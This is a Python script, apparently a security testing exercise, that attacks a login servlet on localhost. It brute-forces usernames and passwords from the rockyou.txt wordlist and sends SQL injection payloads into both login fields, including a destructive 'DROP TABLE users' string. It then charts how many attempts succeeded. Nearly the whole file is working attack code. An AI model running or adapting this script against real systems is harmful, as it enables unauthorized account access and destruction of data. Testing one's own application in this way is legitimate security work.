import requests
import os
import time
import random
import matplotlib.pyplot as plt

LOGIN_URL = 'http://localhost:8080/AdminServlet_war_exploded/admin-servlet?action=login'
PASSWORD_FILE = 'rockyou.txt'
SQL_INJECTION_PAYLOADS = [
    "' OR 1=1 --",  # Classic SQL injection
    "' OR 'a'='a",  # Another common SQL injection
    "' OR 1=1#",     # A variant of SQL injection
    "'; DROP TABLE users --",  # Potential dangerous injection
]

class Attacker:
    def __init__(self):
        self.successCountBruteForce = 0
        self.failureCountBruteForce = 0
        self.totalAttemptsBruteForce = 0
        self.successCountSQL = 0
        self.failureCountSQL = 0
        self.totalAttemptsSQL = 0

    def bruteForceAttack(self, username, password):
        data = {'username': username, 'password': password}
        
        try:
            response = requests.post(LOGIN_URL, data=data)
            print(f"Brute Force - Response: {response.text}")

            self.totalAttemptsBruteForce += 1
            if "failure" in response.text.lower():
                self.failureCountBruteForce += 1
                print(f"Brute Force - Failed attempt with username: {username} and password: {password}")
            elif "success" in response.text.lower():
                self.successCountBruteForce += 1
                print(f"Brute Force - Success with username: {username} and password: {password}")
                return True
        except Exception as e:
            print(f"Brute Force - Error during attempt: {e}")
            return False

    def sqlInjectionAttack(self, username, password):
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        data = {'username': username, 'password': payload}  # Inject payload into password field
        try:
            response = requests.post(LOGIN_URL, data=data)
            print(f"SQL Injection (Password Field) - Response: {response.text}")

            self.totalAttemptsSQL += 1
            if "failure" in response.text.lower():
                self.failureCountSQL += 1
                print(f"SQL Injection (Password Field) - Failed attempt with username: {username} and payload: {payload}")
            elif "success" in response.text.lower():
                self.successCountSQL += 1
                print(f"SQL Injection (Password Field) - Success with username: {username} and payload: {payload}")
                return True

            data = {'username': payload, 'password': password}  # Inject payload into username field
            response = requests.post(LOGIN_URL, data=data)
            print(f"SQL Injection (Username Field) - Response: {response.text}")

            self.totalAttemptsSQL += 1
            if "failure" in response.text.lower():
                self.failureCountSQL += 1
                print(f"SQL Injection (Username Field) - Failed attempt with payload: {payload} and password: {password}")
            elif "success" in response.text.lower():
                self.successCountSQL += 1
                print(f"SQL Injection (Username Field) - Success with payload: {payload} and password: {password}")
                return True
        except Exception as e:
            print(f"SQL Injection - Error during attempt: {e}")
        return False

    def generateChart(self, chart_type):
        if chart_type == "bruteForce":
            labels = ['Success', 'Failure']
            sizes = [self.successCountBruteForce, self.failureCountBruteForce]
            title = f"Brute Force Attempts: Total = {self.totalAttemptsBruteForce}"
            chart_filename = './charts/brute_force_chart.png'
        else:
            labels = ['Success', 'Failure']
            sizes = [self.successCountSQL, self.failureCountSQL]
            title = f"SQL Injection Attempts: Total = {self.totalAttemptsSQL}"
            chart_filename = './charts/sql_injection_chart.png'

        colors = ['#4CAF50', '#FF6347']
        plt.figure(figsize=(6, 6))
        plt.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
        plt.title(title)
        plt.axis('equal')
        plt.savefig(chart_filename)
        plt.close()

    def performAttack(self):
        with open(PASSWORD_FILE, 'r', encoding='latin-1') as file:
            passwords = file.readlines()
            usernames = passwords
        
        for username in usernames:
            for password in passwords:
                password = password.strip()

                print(f"Attempting Brute Force with username: {username.strip()} and password: {password}")
                success = self.bruteForceAttack(username.strip(), password)

                if success:
                    self.generateChart("bruteForce")
                    self.generateChart("sqlInjection")
                    return

                print(f"Attempting SQL Injection with username: {username.strip()} and password: {password}")
                success = self.sqlInjectionAttack(username.strip(), password)

                if success:
                    self.generateChart("bruteForce")
                    self.generateChart("sqlInjection")
                    return

                #time.sleep(0.01)

                self.generateChart("bruteForce")
                self.generateChart("sqlInjection")

def main():
    if not os.path.exists('./charts'):
        os.makedirs('./charts')

    attacker = Attacker()
    attacker.performAttack()

    print("Attack testing completed.")

if __name__ == "__main__":
    main()
